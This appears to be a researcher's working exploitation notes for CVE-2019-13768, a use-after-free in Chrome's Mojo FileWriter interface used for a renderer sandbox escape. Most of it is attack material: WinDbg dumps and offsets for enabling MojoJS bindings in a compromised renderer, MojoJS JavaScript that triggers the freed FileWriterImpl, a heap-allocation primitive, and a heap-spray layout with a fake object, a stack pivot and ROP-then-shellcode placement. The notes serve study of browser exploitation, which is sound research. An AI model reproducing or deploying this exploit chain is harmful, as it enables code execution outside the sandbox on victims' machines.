# CVE-2019-13768

### Set Up

1. We need to build chromium from scratch (which I can't seem to do lmao)

    - Run `copy_needed_bindings.py` to retrieve all of the code needed to interact with the browser process

### MojoJS & Browser Process

According to [chromium](https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md) documentation, Mojo is a collection of runtime libraries providing a platform-agnostic abstraction of common IPC primitives, a message IDL format, and a bindings library with code generation for multiple target languages to facilitate convenient message passing across arbitrary inter-process and intra-process boundaries. IPC is the protocol used by the Browser process to communicate to the Renderer process(es). Typically, the renderer cannot call or use any of these libraries. Even if there is a vulnerability in the Browser process via these Mojo libraries, we cannot "access" it or trigger it from the renderer (normally...)

### SBX

How this variation of sandbox escapes work is that, using the RCE capabilities obtained via Renderer exploits, we basically write the configuration of the Renderer process which will grant us permissions to call these Mojo libraries to then trigger the vulnerabilities from the renderer.

To know what value to write, we need to look at this [file](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/content/public/common/bindings_policy.h) which has the various bindings policy:

```
enum BindingsPolicy {
  BINDINGS_POLICY_NONE = 0,             // 0
  BINDINGS_POLICY_WEB_UI = 1 << 0,      // 1
  BINDINGS_POLICY_MOJO_WEB_UI = 1 << 1, // 2
};
```

- We need to set the bindings to BINDINGS_POLICY_MOJO_WEB_UI, hence 2

Now we need to know where to write this value to. Assuming we have a renderer exploit which gives read/write primative, we can first find the base address of chrome_child.dll which we can via our primatives and offsets. Then we find the location of g_frame_map via offsets as well

```
0:002> ? 00006558f4e82848-0x6558f4e82828
Evaluate expression: 32 = 00000000`00000020
0:002> dq 0x6558f4e82828
00006558`f4e82828  00003e90`f2019ae1 00004266`13382cf1
00006558`f4e82838  00004266`13382cf1 00005a92`c8f1a369
00006558`f4e82848  00007ffe`f917f428 00007708`9c1ba4e0
00006558`f4e82858  00003e90`f2016891 00004266`13382cf1
00006558`f4e82868  00006f85`6aa0f0c9 00000001`00000000
00006558`f4e82878  00003e90`f202e261 00004266`13382cf1
00006558`f4e82888  00004266`13382cf1 00000000`00001000
00006558`f4e82898  00003604`d1298000 00000000`00000002
0:002> u 00007ffe`f917f428
chrome_child!GetHandleVerifier+0x2ebba68:
00007ffe`f917f428 0100            add     dword ptr [rax],eax
00007ffe`f917f42a 0000            add     byte ptr [rax],al
00007ffe`f917f42c 0000            add     byte ptr [rax],al
00007ffe`f917f42e 0000            add     byte ptr [rax],al
00007ffe`f917f430 7021            jo      chrome_child!GetHandleVerifier+0x2ebba93 (00007ffe`f917f453)
00007ffe`f917f432 21f4            and     esp,esi
00007ffe`f917f434 fe              ???
00007ffe`f917f435 7f00            jg      chrome_child!GetHandleVerifier+0x2ebba77 (00007ffe`f917f437)
```

- From address of window: 0x20

- From `chrome_child!GetHandleVerifier+0x2ebba68`: 0x052ef428

After which, we need to look at the following [code](https://chromium.googlesource.com/chromium/src/+/15aa0f24ee824a08b0029b2ce794c7b98f8c6f69/content/renderer/render_frame_impl.cc) to understand more about g_frame_map and how we can use it to find RenderFrameImpl

```
typedef std::map<int, RenderFrameImpl*> RoutingIDFrameMap;
static base::LazyInstance<RoutingIDFrameMap>::DestructorAtExit
    g_routing_id_frame_map = LAZY_INSTANCE_INITIALIZER;
typedef std::map<blink::WebFrame*, RenderFrameImpl*> FrameMap;
base::LazyInstance<FrameMap>::DestructorAtExit g_frame_map =
    LAZY_INSTANCE_INITIALIZER;
```

- g_frame_map is a std::map which is a list of key-value pairs, the value is a pointer to the RenderFrameImpl while the key is a pointer to WebFrame

```
0:002> dq 00007ffe`f9228998 <- g_frame_map
00007ffe`f9228998  00007ffe`f92289a0 000001d5`223467d0
```

- g_frame_map is a LazyInstance, hence it points to a pointer to the actual value which is the map instance

- `00007ffef92289a0` pointer to actual pointer

- `000001d5223467d0` actual pointer

```
0:004> dq 000001f5`a73f9740
000001f5`a73f9740  000001f5`a73f9480 000001f5`a73f9480
000001f5`a73f9750  000001f5`a73f9480 00000000`00000101
000001f5`a73f9760  00000000`00000000 00000000`00000000
000001f5`a73f9770  00000000`00000000 90011d00`70f9d2f7
000001f5`a73f9780  00720063`0069004d 0066006f`0073006f
000001f5`a73f9790  0068004a`00200074 00480067`006e0065
000001f5`a73f97a0  00000000`00690065 00000000`00000000
000001f5`a73f97b0  00000000`00000000 90011e00`7005d2fb
0:004> dq 000001f5`a73f9480
000001f5`a73f9480  000001f5`a73f9740 000001f5`a73f9740
000001f5`a73f9490  000001f5`a73f9740 00000000`00000001
000001f5`a73f94a0  000007cf`dffe1c70 000001f5`a7416160
000001f5`a73f94b0  00000000`00000000 90011200`70d5d2cb
000001f5`a73f94c0  000001f5`a73f94c0 000001f5`a73f94c0
000001f5`a73f94d0  000001f5`a73f94c0 00000000`00000101
000001f5`a73f94e0  00000000`00000000 00000000`00000000
000001f5`a73f94f0  00000000`00000000 90011300`70d1d2cf
```

- std::map is structured as an RBTree

- RBTree Node has 4 properties: left pointer, right pointer, parent pointer, color

- Traverse through the  RBTree Node to find the node whose offset `+0x20` and `+0x28`

- Here are some resources to understand the underlying data structures used in Chrome:

  1. [std::map](https://en.cppreference.com/w/cpp/container/map)

  2. [Chrome's implementation of std::map](https://chromium.googlesource.com/chromium/src/base/+/master/containers/)

  3. [std::map and RBTrees](https://stackoverflow.com/questions/5288320/why-is-stdmap-implemented-as-a-red-black-trees)

  4. [LazyInstances](https://chromium.googlesource.com/chromium/src/base/+/refs/heads/main/lazy_instance.h)

  5. [render_frame_impl.h](https://chromium.googlesource.com/chromium/src/+/71.0.3578.98/content/renderer/render_frame_impl.h) [render_frame_impl.cc](https://chromium.googlesource.com/chromium/src/+/71.0.3578.98/content/renderer/render_frame_impl.cc)

  6. [enable_bindings_](https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=5453;drc=8095e5d9d219ceff1aab5d00aaec59d629d50270)

```
x chrome_child!*enabled_bindings_*
0:013> dt chrome_child!content::RenderFrameImpl 0x23ae19936a0
   +0x000 __VFN_table : 0x00007ffe`f8916fa0 
   +0x008 __VFN_table : 0x00007ffe`f89170f8 
   +0x010 __VFN_table : 0x00007ffe`f8917108 
   =00007ffe`f8520d90 Name_            : [0]  "blink.mojom.AutoplayConfigurationClient"
   +0x020 __VFN_table : 0x00007ffe`f8917120 
   =00007ffe`f8528930 Name_            : [0]  "content.mojom.Frame"
   +0x030 __VFN_table : 0x00007ffe`f8917150 
   =00007ffe`f8528a10 Name_            : [0]  "content.mojom.FrameNavigationControl"
   +0x040 __VFN_table : 0x00007ffe`f8917188 
   =00007ffe`f8520b00 Name_            : [0]  "content.mojom.FullscreenVideoElementHandler"
   +0x050 __VFN_table : 0x00007ffe`f8917198 
   =00007ffe`f85292a0 Name_            : [0]  "content.mojom.HostZoom"
   +0x060 __VFN_table : 0x00007ffe`f89171a8 
   =00007ffe`f8528c30 Name_            : [0]  "content.mojom.FrameBindingsControl"
   +0x068 __VFN_table : 0x00007ffe`f89171c0 
   +0x070 __VFN_table : 0x00007ffe`f89175a8 
   +0x078 __VFN_table : 0x00007ffe`f89175b8 
   =00007ffe`f8861bf0 Name_            : [0]  "service_manager.mojom.InterfaceProvider"
   +0x080 frame_           : 0x00005c0c`3e1e27b0 blink::WebLocalFrame
   +0x088 is_main_frame_   : 1
   +0x090 unique_name_frame_adapter_ : content::RenderFrameImpl::UniqueNameFrameAdapter
   +0x0a0 unique_name_helper_ : content::UniqueNameHelper
   +0x0d0 in_browser_initiated_detach_ : 0
   +0x0d1 in_frame_tree_   : 1
   +0x0d8 render_view_     : 0x0000023a`e18c74b0 content::RenderViewImpl
   +0x0e0 routing_id_      : 0n4
   +0x0e4 proxy_routing_id_ : 0n-2
   +0x0e8 render_widget_   : scoped_refptr<content::RenderWidget>
   +0x0f0 history_subframe_unique_names_ : std::map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,bool,std::less<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<const std::basic_string<char,std::char_traits<char>,std::allocator<char> >,bool> > >
   +0x100 current_history_item_ : blink::WebHistoryItem
   +0x110 pepper_composition_text_ : std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
   +0x130 plugin_power_saver_helper_ : 0x0000023a`e18a3030 content::PluginPowerSaverHelper
   +0x138 cookie_jar_      : content::RendererWebCookieJarImpl
   +0x148 observers_       : base::ObserverList<content::RenderFrameObserver,0,1,base::internal::UncheckedObserverAdapter>
   +0x178 pending_context_menus_ : base::IDMap<content::ContextMenuClient *,int>
   +0x1e8 selection_text_  : std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
   +0x208 selection_text_offset_ : 0x2d0
   +0x210 selection_range_ : gfx::Range
   +0x218 handling_select_range_ : 0
   +0x220 web_user_media_client_ : 0x0000023a`dfab5980 content::UserMediaClientImpl
   +0x228 audio_input_stream_factory_ : mojo::InterfacePtr<content::mojom::RendererAudioInputStreamFactory>
   +0x258 media_permission_dispatcher_ : std::unique_ptr<content::MediaPermissionDispatcher,std::default_delete<content::MediaPermissionDispatcher> >
   +0x260 push_messaging_client_ : 0x0000023a`e18c5fc0 content::PushMessagingClient
   +0x268 registry_        : service_manager::BinderRegistryWithArgs<>
   +0x288 remote_interfaces_ : service_manager::InterfaceProvider
   +0x2e8 blink_interface_registry_ : std::unique_ptr<content::BlinkInterfaceRegistryImpl,std::default_delete<content::BlinkInterfaceRegistryImpl> >
   +0x2f0 local_info_      : service_manager::BindSourceInfo
   +0x360 remote_info_     : service_manager::BindSourceInfo
   +0x3d0 connector_       : mojo::InterfacePtr<service_manager::mojom::Connector>
   +0x400 manifest_manager_ : std::unique_ptr<content::ManifestManager,std::default_delete<content::ManifestManager> >
   +0x408 accessibility_mode_ : ui::AXMode
   +0x410 render_accessibility_ : (null) 
   +0x418 related_apps_fetcher_ : std::unique_ptr<content::RelatedAppsFetcher,std::default_delete<content::RelatedAppsFetcher> >
   +0x420 previews_state_  : 0n32
   +0x424 effective_connection_type_ : 5 ( kType4G )
   +0x428 is_pasting_      : 0
   +0x429 suppress_further_dialogs_ : 0
   +0x430 file_chooser_completion_ : (null) 
   +0x438 blame_context_   : std::unique_ptr<content::FrameBlameContext,std::default_delete<content::FrameBlameContext> >
   +0x440 shared_worker_repository_ : std::unique_ptr<content::SharedWorkerRepository,std::default_delete<content::SharedWorkerRepository> >
   +0x448 active_pepper_instances_ : std::set<content::PepperPluginInstanceImpl *,std::less<content::PepperPluginInstanceImpl *>,std::allocator<content::PepperPluginInstanceImpl *> >
   +0x458 focused_pepper_plugin_ : (null) 
   +0x460 pepper_last_mouse_event_target_ : (null) 
   +0x468 host_zoom_levels_ : std::map<GURL,double,std::less<GURL>,std::allocator<std::pair<const GURL,double> > >
   +0x478 autoplay_flags_  : std::pair<url::Origin,int>
   +0x4e0 autoplay_configuration_binding_ : mojo::AssociatedBinding<blink::mojom::AutoplayConfigurationClient,mojo::RawPtrImplRefTraits<blink::mojom::AutoplayConfigurationClient> >
   +0x500 frame_binding_   : mojo::Binding<content::mojom::Frame,mojo::RawPtrImplRefTraits<content::mojom::Frame> >
   +0x530 host_zoom_binding_ : mojo::AssociatedBinding<content::mojom::HostZoom,mojo::RawPtrImplRefTraits<content::mojom::HostZoom> >
   +0x550 frame_bindings_control_binding_ : mojo::AssociatedBinding<content::mojom::FrameBindingsControl,mojo::RawPtrImplRefTraits<content::mojom::FrameBindingsControl> >
   +0x570 frame_navigation_control_binding_ : mojo::AssociatedBinding<content::mojom::FrameNavigationControl,mojo::RawPtrImplRefTraits<content::mojom::FrameNavigationControl> >
   +0x590 fullscreen_binding_ : mojo::AssociatedBinding<content::mojom::FullscreenVideoElementHandler,mojo::RawPtrImplRefTraits<content::mojom::FullscreenVideoElementHandler> >
   +0x5b0 navigation_client_impl_ : std::unique_ptr<content::NavigationClient,std::default_delete<content::NavigationClient> >
   +0x5b8 has_accessed_initial_document_ : 0
   +0x5c0 media_factory_   : content::MediaFactory
   +0x640 associated_interfaces_ : blink::AssociatedInterfaceRegistry
   +0x660 remote_associated_interfaces_ : std::unique_ptr<blink::AssociatedInterfaceProvider,std::default_delete<blink::AssociatedInterfaceProvider> >
   +0x668 committed_first_load_ : 0
   +0x669 name_changed_before_first_commit_ : 0
   +0x66a browser_side_navigation_pending_ : 0
   +0x670 browser_side_navigation_pending_url_ : GURL
   +0x6f0 enabled_bindings_ : 0n2
   +0x6f8 pending_navigation_info_ : std::unique_ptr<content::RenderFrameImpl::PendingNavigationInfo,std::default_delete<content::RenderFrameImpl::PendingNavigationInfo> >
   +0x700 browser_info_    : service_manager::BindSourceInfo
   +0x770 frame_host_ptr_  : mojo::AssociatedInterfacePtr<content::mojom::FrameHost>
   +0x788 interface_provider_bindings_ : mojo::BindingSetBase<service_manager::mojom::InterfaceProvider,mojo::Binding<service_manager::mojom::InterfaceProvider,mojo::RawPtrImplRefTraits<service_manager::mojom::InterfaceProvider> >,void>
   +0x7e0 loader_factories_ : scoped_refptr<content::ChildURLLoaderFactoryBundle>
   +0x7e8 frame_request_blocker_ : scoped_refptr<content::FrameRequestBlocker>
   +0x7f0 overlay_routing_token_ : base::Optional<base::UnguessableToken>
   +0x808 pending_routing_token_callbacks_ : std::vector<base::RepeatingCallback<void (const base::UnguessableToken &)>,std::allocator<base::RepeatingCallback<void (const base::UnguessableToken &)> > >
   +0x820 input_target_client_impl_ : content::InputTargetClientImpl
   +0x860 devtools_frame_token_ : base::UnguessableToken
   +0x870 has_scrolled_focused_editable_node_into_rect_ : 0
   +0x874 rect_for_scrolled_focused_editable_node_ : gfx::Rect
   +0x888 computed_ax_tree_ : std::unique_ptr<blink::WebComputedAXTree,std::default_delete<blink::WebComputedAXTree> >
   +0x890 frame_size_      : base::Optional<gfx::Size>
   +0x89c num_certificate_warning_messages_ : 0
   +0x8a0 certificate_warning_origins_ : std::set<url::Origin,std::less<url::Origin>,std::allocator<url::Origin> >
   +0x8b0 websocket_handshake_throttle_provider_ : std::unique_ptr<content::WebSocketHandshakeThrottleProvider,std::default_delete<content::WebSocketHandshakeThrottleProvider> >
   +0x8b8 num_burst_download_requests_ : 0n0
   +0x8c0 burst_download_start_time_ : base::TimeTicks
   +0x8c8 committing_main_request_ : 0
   +0x8c9 replaying_main_response_ : 0
   +0x8d0 weak_factory_    : base::WeakPtrFactory<content::RenderFrameImpl>
```

```
0:013> dq 0x1bb9979f8e0
000001bb`9979f8e0  00000053`00000002 00000000`00000000
000001bb`9979f8f0  5f746e65`746e6f63 00726573`776f7262
000001bb`9979f900  00000000`0000000f 00000000`0000000f
000001bb`9979f910  000001bb`99849140 2d73776f`646e6977
000001bb`9979f920  00000000`00000024 00000000`0000002f
000001bb`9979f930  00000000`00000000 00007ffd`76577840
000001bb`9979f940  00000000`00000000 00000000`0000000f
000001bb`9979f950  000001bb`998211e0 00000000`00000002
0:013> dc 0x1bb9979f8e0
000001bb`9979f8e0  00000002 00000053 00000000 00000000  ....S...........
000001bb`9979f8f0  746e6f63 5f746e65 776f7262 00726573  content_browser.
000001bb`9979f900  0000000f 00000000 0000000f 00000000  ................
000001bb`9979f910  99849140 000001bb 646e6977 2d73776f  @.......windows-
000001bb`9979f920  00000024 00000000 0000002f 00000000  $......./.......
000001bb`9979f930  00000000 00000000 76577840 00007ffd  ........@xWv....
000001bb`9979f940  00000000 00000000 0000000f 00000000  ................
000001bb`9979f950  998211e0 000001bb 00000002 00000000  ................
```

```
0:004> dq 000001f5`a73f9480
000001f5`a73f9480  000001f5`a73f9740 000001f5`a73f9740
000001f5`a73f9490  000001f5`a73f9740 00000000`00000001
000001f5`a73f94a0  000007cf`dffe1c70 000001f5`a7416160
...
0:004> dq  000007cf`dffe1c70
000007cf`dffe1c70  00007ffe`f8914c70 00000000`00000000
...
0:004> u 00007ffe`f8914c70
chrome_child!blink::WebLocalFrameImpl::`vftable':
00007ffe`f8914c70 50              push    rax
...
0:004> dq 000001f5`a7416160
000001f5`a7416160  00007ffe`f8916fa0 00007ffe`f89170f8
...
0:004> u 00007ffe`f8916fa0
chrome_child!content::RenderFrameImpl::`vftable':
00007ffe`f8916fa0 ac              lods    byte ptr [rsi]
...
```

Here are writeups using similar techniques to escape renderer sandbox: [22177](https://ctftime.org/writeup/22177), [29352](https://ctftime.org/writeup/29352)

### Vulnerability: UaF

- Vulnerability located in the FileWriter APIs. FileWriter is exposed by the Browser which allows renderers to performed writes within sandboxed filesystems

- Look at the codes below:

  ```
  interface FileSystemManager {
    ...
    CreateWriter(url.mojom.Url file_path) => (mojo_base.mojom.FileError result, blink.mojom.FileWriter? writer);
    ...
  };
  void FileSystemManagerImpl::CreateWriter(const GURL& file_path, CreateWriterCallback callback) {
    ...
    mojo::MakeStrongBinding(
      std::make_unique<storage::FileWriterImpl>(url, context_->CreateFileSystemOperationRunner(),blob_storage_context_->context()->AsWeakPtr()),
      MakeRequest(&writer)
    );
    ...
  }
  interface FileWriter {
    ...
    Write(uint64 position, Blob blob) => (mojo_base.mojom.FileError result, uint64 bytes_written);
    ...
  }
  void FileWriterImpl::Write(uint64_t position, blink::mojom::BlobPtr blob, WriteCallback callback) {
    blob_context_->GetBlobDataFromBlobPtr(
      std::move(blob),
      base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this), std::move(callback), position)
    );
  }
  void BlobStorageContext::GetBlobDataFromBlobPtr(
    blink::mojom::BlobPtr blob,
    base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback
  ) {
    DCHECK(blob);
    blink::mojom::Blob* raw_blob = blob.get();
    raw_blob->GetInternalUUID(
      mojo::WrapCallbackWithDefaultInvokeIfNotRun(
        base::BindOnce(
          [](
            blink::mojom::BlobPtr, base::WeakPtr<BlobStorageContext> context,
            base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback,
            const std::string& uuid
          ) {
            if (!context || uuid.empty()) {
              std::move(callback).Run(nullptr);
              return;
            }
            std::move(callback).Run(context->GetBlobDataFromUUID(uuid));
          },
          std::move(blob), 
          AsWeakPtr(), 
          std::move(callback)
        ),
        ""
      )
    );
  }
  interface Blob {
    ...
    GetInternalUUID() => (string uuid);
  };
  ```

  - CreateWriter creates a FileWriter object which is a StrongBinding object. 
  
    - mojo::StrongBinding objects are objects with their own interface implementation and can control the lifetime of the object as per [this sketchy chinese blog](https://www.cnblogs.com/huangguanyuan/p/10320950.html)

  - FileWriter::Write() will call GetBlobDataFromBlobPtr

  - GetBlobDataFromBlobPtr will call argument blob's GetInternalUUID() function which needs to return a UUID

    - The callback function which will execute at the end of GetInternalUUID is DoWrite

  - When the GetInternalUUID() returns, we will find the blob associated with the UUID and call the callback function with the blob as an argument

  - We can specify our own asynchronous GetInternalUUID() to trigger the free and fills

  - When the DoWrite (the callback function) is finally executed, it references the freed FileWriter object

### Relevant codes for DoWrite

```
chrome!storage::FileSystemOperationRunner::GetMetadata+0x33
storage/browser/fileapi/file_system_operation_runner.cc

OperationID FileSystemOperationRunner::GetMetadata(
    const FileSystemURL& url,
    int fields,
    GetMetadataCallback callback) {
  base::File::Error error = base::File::FILE_OK;
  std::unique_ptr<FileSystemOperation> operation = base::WrapUnique(
    file_system_context_->CreateFileSystemOperation(url, &error)
  );
  FileSystemOperation* operation_raw = operation.get();
  OperationID id = BeginOperation(std::move(operation));
  base::AutoReset<bool> beginning(&is_beginning_operation_, true);
  if (!operation_raw) {
    DidGetMetadata(id, std::move(callback), error, base::File::Info());
    return id;
  }
  PrepareForRead(id, url);
  operation_raw->GetMetadata(
      url, fields,
      base::BindOnce(&FileSystemOperationRunner::DidGetMetadata, weak_ptr_, id,
                     std::move(callback)));
  return id;
}
```

```
chrome!storage::FileSystemContext::CreateFileSystemOperation+0x4c:
storage/browser/fileapi/file_system_context.cc

FileSystemOperation* FileSystemContext::CreateFileSystemOperation(
    const FileSystemURL& url, base::File::Error* error_code) {
  if (!url.is_valid()) {
    if (error_code)
      *error_code = base::File::FILE_ERROR_INVALID_URL;
    return nullptr;
  }

  FileSystemBackend* backend = GetFileSystemBackend(url.type());
  if (!backend) {
    if (error_code)
      *error_code = base::File::FILE_ERROR_FAILED;
    return nullptr;
  }

  base::File::Error fs_error = base::File::FILE_OK;
  FileSystemOperation* operation = backend->CreateFileSystemOperation(url, this, &fs_error); <- this is where you want to get to

  if (error_code)
    *error_code = fs_error;
  return operation;
}
```

```
FileSystemBackend* FileSystemContext::GetFileSystemBackend(FileSystemType type) const {
  auto found = backend_map_.find(type);
  if (found != backend_map_.end()) return found->second;
  NOTREACHED_IN_MIGRATION() << "Unknown filesystem type: " << type;
  return nullptr;
}
```

```
std::map<FileSystemType, FileSystemBackend*> backend_map_;
```

### Writing the trigger exploit (just DoS this shit)

1. Create File System Manager interface

    ```
    let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
    Mojo.bindInterface(blink.mojom.FileSystemManager.name, mojo.makeRequest(file_system_manager_ptr).handle, "process");
    ```

2. Create a valid FileWriter object

    ```
    var create_writer_result = await file_system_manager_ptr.createWriter(file_url);
    ```

    - file_url is of `url.mojom.Url` type

    - To create a valid file_url object:

        ```
        let host_url = new url.mojom.Url();
        host_url.url = window.location.href;

        let open_result = await file_system_manager_ptr.open(host_url, 0);

        let file_url = new url.mojom.Url();
        file_url.url = open_result.rootUrl.url + '/aaaa';
        ```

    - I feel like this is done by reading the Mojo documentation (bopez)

    - I feel like this can be done more than one way

3. Call Write() with the appropriate blob

    ```
    create_writer_result.writer.write(0, blob_impl_ptr);
    ```

    - To create a valid blob_impl_ptr with the appropriate GetInternalUUID

      ```
      function Blob0Impl() {
        this.binding = new mojo.Binding(blink.mojom.Blob, this);
      }

      Blob0Impl.prototype = {
        getInternalUUID: async (arg0) => {
          print('  [*] getInternalUUID');

          print('  [!] freeing FileWriterImpl');
          create_writer_result.writer.ptr.reset();

          Blob0();

          print('  [*] FileWriterImpl::DoWrite');
          return {'uuid': 'blob_0'};
        }
      };

      let blob_impl = new Blob0Impl();
      let blob_impl_ptr = new blink.mojom.BlobPtr();
      blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
      ```

    - Similarly, I feel like this is done by reading the Mojo documentation

    - To create and register a blob with the relevant uuid:

      ```
      let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
      Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(blob_registry_ptr).handle, "process");

      async function Blob0() {
        function BytesProviderImpl() {
          this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
        }

        let bytes_provider = new BytesProviderImpl();
        let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
        bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));

        let blob_ptr = new blink.mojom.BlobPtr();
        let blob_req = mojo.makeRequest(blob_ptr);

        let data_element = new blink.mojom.DataElement();
        data_element.bytes = new blink.mojom.DataElementBytes();
        data_element.bytes.length = 1;
        data_element.bytes.embeddedData = [0];
        data_element.bytes.data = bytes_provider_ptr;

        await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);
      }
      ```

4. Output:

    ![](./screenshots/trigger.png)

    - Somehow we manage to call CreateFileSystemOperation() and pass the url.is_valid() check. The dangling freed object must somehow still be abled to be dereferenced 1-2 times before dying when url.type() is called since url is not a valid object to begin with

      ```
      FileSystemOperation* FileSystemContext::CreateFileSystemOperation(const FileSystemURL& url, base::File::Error* error_code) {
      if (!url.is_valid()) {
        if (error_code)
          *error_code = base::File::FILE_ERROR_INVALID_URL;
        return nullptr;
      }

      FileSystemBackend* backend = GetFileSystemBackend(url.type()); <- Die here
      ...
      ```

### Road to exploitation: Replacement

- Given that we the URL object has been freed, we first need to replace it

- Use `BlobRegistry registerFromStream` method to create controllable heap allocator in the Browser

  ```
  function Allocation(size=280) {
    function ProgressClient() {
      function ProgressClientImpl() {
      }

      ProgressClientImpl.prototype = {
        onProgress: async (arg0) => {
        }
      };

      var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
      var progress_client_req = mojo.makeRequest(progress_client_ptr);
      var progress_client_binding = new mojo.AssociatedBinding(
        blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

      return progress_client_ptr;
    }

    this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
    this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

    this.malloc = function(data) {
      this.pipe.producer.writeData(data);
    }

    this.free = function() {
      this.pipe.producer.close();
    }

    return this;
  }
  ```

- Output:

    ![](./screenshots/trigger_replace.png)

    - When we properly replace the dangling object, we die earlier at `file_system_context_->CreateFileSystemOperation(url, &error)` when we are attempting to set RCX as the URL object before calling CreateFileSystemOperation (RCX stores the first argument when calling a function)

    - `bp chrome_7ffe77d90000!storage::FileSystemOperationRunner::GetMetaData` / `bp chrome_7ffe77d90000+0x01661a99-0x33` (function call)

    - `bp chrome_7ffe77d90000!storage::FileSystemOperationRunner::GetMetaData+0x33` / `bp chrome_7ffe77d90000+0x01661a99` (mov rcx, [rcx+8])

    - `bp chrome_7ffe77d90000!storage::FileSystemContext::CreateFileSystemOperation+0x19` (cmp byte ptr [rdx],0 ds:PointerToDanglingObject+0x20=url_valid)

    - `bp chrome_7ffe77d90000!storage::FileSystemContext::CreateFileSystemOperation+0x4c`

### Road to exploitation: Proper replacement to support heap spray + heap spray

- We will replace the freed object such that +0x8 is a pointer to our heap, +0x20 is not 0 in order to pass the `is_valid()` check

- We will need to spray valid FileSystemURL objects such that one exists at 0x40404040000n

  - How to create the fake FileSystemURL object such that we can reach the `call` instruction at `FileSystemOperation* operation = backend->CreateFileSystemOperation(url, this, &fs_error);`:

    1. CreateFileSystemOperation

        ![](./screenshots/fake_filesystemurl_object_objective.png)

    2. GetFileSystemBackend

        ![](./screenshots/fake_filesystemurl_object_clearing_GetFileSystemBackend.png)

    3. GetFileSystemBackend ret value

        ![](./screenshots/fake_filesystemurl_object_clearing_GetFileSystemBackend_ret_value.png)

  - Modified heap spray object

    ```
    // kFileSystemOperationRunnerPtr
    page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x0, 0xdeadbeefn, true); // kFileSystemOperationRunnerPtr
    page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x8, kFileSystemContextPtr, true); // should point to kFileSystemContextPtr

    // kFileSystemContextPtr
    page.setBigUint64(kFileSystemContextPtrBaseAddressOffset + 0x78, kFileSystemBackendNodePtr, true); // kFileSystemBackendNodePtr

    // kFileSystemBackendNodePtr
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x8, kSomeValuePtr, true); // kSomeValuePtr, needs to be bigger than 
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x20, 0x0n, true);
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr

    // kSomeValuePtr
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x0, kSomeValueAgainPtr, true); // kSomeValueAgainPtr
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x19, 0x0n, true);
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr

    // kSomeValueAgainPtr
    page.setBigUint64(kSomeValueAgainPtrBaseAddressOffset + 0x19, 0x1n, true);

    // kFileSystemBackendPtr / kThisShouldPointToHeapPtrWhichPointsToStartOfRop
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x0, kSomeValueAgainAgainPtr, true); // kSomeValueAgainAgainPtr
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x10, kHeapPtrToStartOfRop, true); // kHeapPtrToStartOfRop
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x50, ret_gadget_ptr, true); // rdx

    // kSomeValueAgainAgainPtr
    page.setBigUint64(kSomeValueAgainAgainPtrBaseAddressOffset + 0x38, pivot_gadget_ptr, true); // will jmp rdx at the end, so rdx should be a ret

    // kHeapPtrToStartOfRop
    for (var i = 0; i < stack.byteLength; ++i) {
      page.setUint8(kHeapPtrToStartOfRopBaseAddressOffset + i, stack.getUint8(i));
    }

    // kPtrToStartOfShellCode
    for (var i = 0; i < shellcode.byteLength; ++i) {
      page.setUint8(kPtrToStartOfShellCodeBaseAddressOffset + i, shellcode.getUint8(i));
    }
    ```

- We will spray in 0x1000 bytes (technically 0x40404041000n should work as well?)

  - Lowest heap address

    ![](./screenshots/heap_spray_starting_addresses.png)

### Debugging

- Pointer to freed object

  ![](./screenshots/object_replacement_pointer.png)

- Stack Pivoting

  ![](./screenshots/fake_filesystemurl_object_stack_pivot_to_rop.png)

- RIP Control

  ![](./screenshots/fake_filesystemurl_object_rop_to_rip_control.png)

### ROP chain

- Will not cover

- For some reason you cannot directly do VirtualProtect/VirtualAlloc on the heap memory. so what the original exploit writer did is to create a RW- space via VirtualAlloc before running memcpy to copy our shellcode to the RW- space before running VirtualProtect to set it as R-X before running the shellcode

# Others

### Finding Offsets

- g_core for list of Mojo handles

  ```
  0:013> dq chrome_child!g_core
  00007fff`9d838168  000001f6`51648f10 00007fff`9d838178
  00007fff`9d838178  00000000`00000014 00000000`00000000
  00007fff`9d838188  00000000`8000001f 00000000`00000000
  00007fff`9d838198  00007fff`9cbc6a38 00000000`8000001e
  00007fff`9d8381a8  00000000`00000000 00000000`00000000
  00007fff`9d8381b8  00000000`00000000 00007fff`9d807f20
  00007fff`9d8381c8  00000000`00000000 00000000`00000000
  00007fff`9d8381d8  00000000`00000000 00000000`00000000
